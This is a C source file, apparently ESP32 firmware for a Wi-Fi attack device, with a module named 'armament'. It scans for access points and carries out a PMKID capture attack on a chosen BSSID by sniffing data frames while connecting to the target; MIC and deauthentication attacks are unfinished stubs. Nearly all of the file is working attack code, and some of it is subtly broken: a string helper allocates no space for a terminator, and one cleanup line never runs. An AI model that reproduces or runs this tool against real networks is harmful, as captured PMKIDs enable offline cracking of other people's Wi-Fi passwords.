#include "armament.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_wifi_types.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DEFINE_BASE(ARMAMENT_CMD_EVENT_BASE);
ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static uint8_t wifi_init_status = WIFI_NOT_INITIALIZED;
static TaskHandle_t pmkid_sniff_task_handle = NULL;

static uint8_t int_target_bssid[6];

void output_ap(wifi_ap_record_t *ap_record) {
  uint8_t *bssid = ap_record->bssid;
  char output_buffer[100];
  char *p_output_buffer = output_buffer;

  sprintf(p_output_buffer, "%02X:%02X:%02X:%02X:%02X:%02X,", bssid[0], bssid[1],
          bssid[2], bssid[3], bssid[4], bssid[5]);

  p_output_buffer += 18;
  for (uint8_t i = 0; i < 33; i++) {
    if (ap_record->ssid[i] == 0) {
      break;
    } else {
      sprintf(p_output_buffer, "%02X", ap_record->ssid[i]);
      p_output_buffer += 2;
    }
  }
  sprintf(p_output_buffer, ",%02X", (uint8_t)ap_record->rssi);
  p_output_buffer += 3;
  sprintf(p_output_buffer, ",%02X,", (uint8_t)ap_record->primary);

  printf("{SCAN,%s}\n", output_buffer);
}

void arma_reconnaissance() {
  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;

  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap(&ap_record);
  }
}

char *string_append(char *s1, char *s2) {
  int s1_length = strlen(s1);
  int s2_length = strlen(s2);
  int size = s1_length + s2_length;
  char *s = calloc(size, sizeof(char));

  for (int i = 0; i < s1_length; i++) {
    s[i] = s1[i];
  }
  for (int i = 0; i < s2_length; i++) {
    s[s1_length + i] = s2[i];
  }
  return s;
}

uint8_t convert_to_uint8_t(char s1, char s2) {
  char *s;
  uint8_t uint8_bit;
  if (s1 == '\0' || s2 == '\0') return 0;
  char s1a[] = {s1, '\0'};
  char s2a[] = {s2, '\0'};
  s = string_append(s1a, s2a);
  uint8_bit = strtol(s, NULL, 16);
  free(s);
  return uint8_bit;
}

uint8_t calc_length_of_ssid_name(uint8_t *ssid_name) {
  uint8_t length = 0;
  for (uint8_t i = 0; i < 33; i++) {
    if (ssid_name[i] == 0) {
      break;
    } else {
      length++;
    }
  }
  if (length > 33) {
    printf("Length of SSID is %u\n", length);
    return 0;
  } else if (length == 0) {
    printf("Length of SSID is 0\n");
    return 0;
  }
  return length;
}

void arma_pmkid_sniff_duration() {
  while (1) {
    vTaskDelay(5000 / portTICK_PERIOD_MS);
    printf("Failed to sniff PMKID from %02X:%02X:%02X:%02X:%02X:%02X\n",
           int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
           int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);

    frame_parser_clear_target_param();
    frame_parser_unregister_data_frame_handler();
    armament_attack_notification_event_unregister();
    wifi_sniffer_stop();
    wifi_disconnect_from_ap(int_target_bssid);

    vTaskDelete(NULL);
    pmkid_sniff_task_handle = NULL;
  }
}

void delete_arma_task_pmkid_sniff_duration() {
  if (pmkid_sniff_task_handle != NULL) {
    vTaskDelete(pmkid_sniff_task_handle);
    pmkid_sniff_task_handle = NULL;
  }
}

void arma_pmkid(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    int_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }

  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;

  printf("Looking for ap: %02X:%02X:%02X:%02X:%02X:%02X\n", int_target_bssid[0],
         int_target_bssid[1], int_target_bssid[2], int_target_bssid[3],
         int_target_bssid[4], int_target_bssid[5]);

  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap(&ap_record);

    if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
      uint8_t ssid_len = calc_length_of_ssid_name(ap_record.ssid);
      uint8_t channel = ap_record.primary;
      uint8_t *bssid = ap_record.bssid;

      printf("Found target ap: %02X:%02X:%02X:%02X:%02X:%02X\n", bssid[0],
             bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      printf("Channel of ap is %u\n", channel);

      frame_parser_set_target_parameter(int_target_bssid, PARSE_PMKID);
      frame_parser_register_data_frame_handler();
      armament_attack_notification_event_register();
      wifi_sniffer_start();
      wifi_set_filter(DATA);
      wifi_set_channel(channel);
      wifi_connect_to_ap(ap_record.ssid, ssid_len, channel, int_target_bssid);
      xTaskCreatePinnedToCore(arma_pmkid_sniff_duration, TPS_NAME,
                              TPS_STACK_SIZE, NULL, TPS_PRIORITY,
                              &pmkid_sniff_task_handle, TPS_CORE_ID);
      break;
    }
  }
}

// TODO: Implement a function to deactivate armament
static void armament_activate(void *args, esp_event_base_t event_base,
                              int32_t event_id, void *event_data) {
  armament_cmd_event_data *cmd_event_data;
  cmd_event_data = (armament_cmd_event_data *)event_data;

  char *arma_selected = cmd_event_data->arma_selected;
  char *target_bssid = cmd_event_data->target_bssid;

  if (wifi_init_status == WIFI_NOT_INITIALIZED) {
    wifi_app_init();
    wifi_init_status = WIFI_INITIALIZED;
  }

  if (memcmp(arma_selected, RECONNAISSANCE, 2) == 0) {
    printf("Using reconnaissance\n");
    arma_reconnaissance();
  } else if (memcmp(arma_selected, PMKID, 2) == 0) {
    printf("Using pmkid based attack\n");
    arma_pmkid(target_bssid);
  } else if (memcmp(arma_selected, MIC, 2) == 0) {
    // TODO: Attack method is mic
  } else if (memcmp(arma_selected, DEAUTH, 2) == 0) {
    // TODO: Deauth a client
  }
}

void armament_cmd_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(ARMAMENT_CMD_EVENT_BASE, CMD_EVENT,
                                             &armament_activate, NULL));
  printf("Cmd event handler registered\n");
}

void armament_cmd_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(ARMAMENT_CMD_EVENT_BASE,
                                               CMD_EVENT, &armament_activate));
  printf("Cmd event handler unregistered\n");
}

void handle_post_pmkid_attack() {
  frame_parser_clear_target_param();
  frame_parser_unregister_data_frame_handler();
  armament_attack_notification_event_unregister();
  wifi_sniffer_stop();
  wifi_disconnect_from_ap(int_target_bssid);
  delete_arma_task_pmkid_sniff_duration();
}

void handle_post_mic_attack() {
  // TODO: Implement this
}

static void attack_notification(void *args, esp_event_base_t event_base,
                                int32_t event_id, void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == PMKID_BASED) {
    printf("Handle post pmkid attack\n");
    handle_post_pmkid_attack();
  } else if (notification_data->atk_context == MIC_BASED) {
    printf("Handle post mic attack\n");
    handle_post_mic_attack();
  }
}

void armament_attack_notification_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
                                             ATK_STATS_EVENT_ID,
                                             &attack_notification, NULL));
  printf("Attack notification event registered\n");
}

void armament_attack_notification_event_unregister() {
  ESP_ERROR_CHECK(
      esp_event_handler_unregister(ARMAMENT_ATTACK_STATUS_EVENT_BASE,
                                   ATK_STATS_EVENT_ID, &attack_notification));
  printf("Attack notification event unregistered\n");
}
